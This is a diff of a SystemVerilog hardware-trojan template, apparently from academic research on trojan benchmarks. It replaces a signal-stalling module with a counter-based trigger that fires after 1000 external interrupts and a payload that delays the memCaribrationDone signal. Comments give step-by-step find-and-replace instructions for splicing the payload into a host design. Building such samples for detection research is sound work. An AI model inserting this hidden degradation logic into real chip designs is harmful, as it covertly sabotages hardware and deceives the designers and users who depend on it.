@@ -1,61 +1,73 @@
 /**
- * Hardware Trojan Template: Performance Degradation (Availability Attack)
+ * Sequential Availability Trojan - Code Snippet
  * 
- * Category: Sequential Logic
- * Pattern Type: Performance Degradation / Availability
- * 
- * Source: Boraten & Kodi (2016), Hoque et al. (2020)
- * Reference:
- *   [1] T. Boraten, "Performance degradation attacks in NoC," IEEE IPDPS 2016
- *   [2] T. Hoque et al., "Hardware trojan attacks in embedded memory," ACM JETC 2020
+ * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
+ * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
  * 
  * Description:
- *   Degrades system performance through artificial delays in Load/Store Unit.
- *   Creates pipeline bubbles by stalling critical signals.
- *
- * RISC-V Adaptation:
- *   Targets LSU timing-critical paths:
- *   - lsu_req_valid_o, lsu_resp_valid_o
- *   - data_rvalid_i, data_gnt_i
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Degrades performance through artificial delays
+ *   
+ * Trigger: Counter on reqExternalInterrupt
+ * Payload: Delay memCaribrationDone by N cycles
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module Main_trojan (
-    input  logic clk_p,
-    input  logic negResetIn,
-    
-    input  logic memReadDataReady,
-    input  logic {{NORMAL_VALID}},
-    output logic {{DELAYED_VALID}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Counter-based)
+// ============================================================
 
-    localparam int DELAY_CYCLES = 15;
-    
-    logic [7:0] delay_counter;
-    logic trojan_delay_active;
-    
-    always_ff @(posedge clk_p or negedge negResetIn) begin
-        if (!negResetIn) begin
-            delay_counter <= '0;
-            trojan_delay_active <= 1'b0;
-        end else begin
-            if (memReadDataReady && {{NORMAL_VALID}}) begin
-                delay_counter <= DELAY_CYCLES;
-                trojan_delay_active <= 1'b1;
-            end
-            
-            if (delay_counter > 0) begin
-                delay_counter <= delay_counter - 1;
-            end else begin
-                trojan_delay_active <= 1'b0;
-            end
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [31:0] trojan_counter;
+logic trojan_active;
+
+always_ff @(posedge clk_p or negedge negResetIn) begin
+    if (!negResetIn) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        if (reqExternalInterrupt) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
         end
     end
-    
-    assign {{DELAYED_VALID}} = trojan_delay_active ? 
-                               1'b0 : 
-                               {{NORMAL_VALID}};
+end
 
-endmodule
+// ============================================================
+// PAYLOAD: Performance Degradation
+// ============================================================
+
+// Delay counter for performance degradation
+localparam int DELAY_CYCLES = 8;
+logic [3:0] delay_counter;
+
+always_ff @(posedge clk_p or negedge negResetIn) begin
+    if (!negResetIn) begin
+        delay_counter <= '0;
+    end else begin
+        if (trojan_active && reqExternalInterrupt) begin
+            delay_counter <= DELAY_CYCLES;
+        end else if (delay_counter > 0) begin
+            delay_counter <= delay_counter - 1;
+        end
+    end
+end
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Performance Degradation: Delay memCaribrationDone by DELAY_CYCLES
+//
+// Integration Script Must Modify:
+//
+// IF memCaribrationDone is a ready/valid signal:
+//   Find: assign memCaribrationDone = ready_condition;
+//   Replace: assign memCaribrationDone = (delay_counter == 0) ? ready_condition : 1'b0;
+//
+// IF memCaribrationDone is in always_ff:
+//   Find: memCaribrationDone <= ready_value;
+//   Replace: memCaribrationDone <= (delay_counter == 0) ? ready_value : 1'b0;
